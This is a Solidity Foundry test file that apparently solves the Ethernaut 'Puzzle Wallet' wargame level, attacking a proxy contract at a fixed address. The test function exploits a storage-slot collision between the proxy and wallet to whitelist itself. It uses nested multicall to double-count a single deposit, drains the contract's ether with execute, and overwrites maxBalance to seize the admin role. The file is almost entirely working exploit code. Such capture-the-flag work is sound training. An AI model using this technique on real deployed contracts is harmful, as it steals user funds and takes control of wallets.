// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuzzleProxy, PuzzleWallet} from "../src/Wallet.sol";

contract PuzzleTest is Test {
    address public addr = 0x38EDDD23B3841B23684b8cED0b76639fF9e4cd79;
    address public me = 0x947c5fFb05ed063d6edDc8a604AD99B3df3d599A;

    PuzzleProxy public proxy;
    PuzzleWallet public wallet;

    function setUp() public {
        proxy = PuzzleProxy(addr);
        wallet = PuzzleWallet(addr);
    }

    function testAttack() public {
        proxy.proposeNewAdmin(address(this));
        wallet.addToWhitelist(address(this));

        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeWithSignature("deposit()");

        bytes[] memory data2 = new bytes[](1);
        data2[0] = data[0];

        data[1] = abi.encodeWithSignature("multicall(bytes[])", data2);

        console.log(wallet.balances(address(this)));
        wallet.multicall{value: 0.001 ether}(data);
        console.log(wallet.balances(address(this)));

        console.log(addr.balance);
        wallet.execute(me, 0.002 ether, "");
        console.log(addr.balance);

        wallet.setMaxBalance(uint256(uint160(me)));

        assertEq(proxy.admin(), me);
    }
}
